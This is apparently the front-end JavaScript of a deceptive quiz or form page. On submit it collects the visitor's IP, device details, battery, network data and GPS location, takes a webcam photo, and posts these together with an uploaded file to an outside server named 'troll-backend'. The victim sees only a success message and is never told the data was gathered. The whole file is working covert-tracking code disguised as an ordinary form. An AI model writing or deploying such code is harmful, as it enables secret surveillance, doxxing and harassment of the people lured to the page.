const btn = document.getElementById("submit-btn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ================================
// GET DEVICE IP
// ================================
async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "N/A";
  }
}

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    time: new Date().toLocaleString(),
    ip: await getIP(),
    deviceMemory: navigator.deviceMemory || "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A"
  };

  // Battery info
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
    } catch {}
  }

  // Geolocation
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject)
      );
      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {
      metadata.location = "Denied";
    }
  }

  return metadata;
}

// ================================
// CAPTURE CAMERA
// ================================
async function captureCamera() {
  const stream = await navigator.mediaDevices.getUserMedia(constraints);
  video.srcObject = stream;

  await new Promise(r => setTimeout(r, 2000)); // give time for camera

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const image = canvas.toDataURL("image/png");

  stream.getTracks().forEach(track => track.stop());

  return image;
}

// ================================
// SEND CAMERA IMAGE + METADATA
// ================================
async function sendCameraData() {
  const metadata = await collectMetadata();
  const image = await captureCamera();

  const res = await fetch(`${BACKEND_BASE}/upload`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image, metadata })
  });

  return await res.json();
}

// ================================
// SEND FILE UPLOAD
// ================================
async function sendFile(file) {
  if (!file) return;

  const reader = new FileReader();
  return new Promise((resolve, reject) => {
    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ fileData: reader.result, filename: file.name })
        });
        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM
// ================================
btn.addEventListener("click", async e => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please select a file before submitting!");
    return;
  }

  try {
    await sendCameraData();
    await sendFile(fileInput.files[0]);

    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "flex";
  } catch (err) {
    console.error("Submission error:", err);
    alert("Something went wrong while submitting.");
  }
});
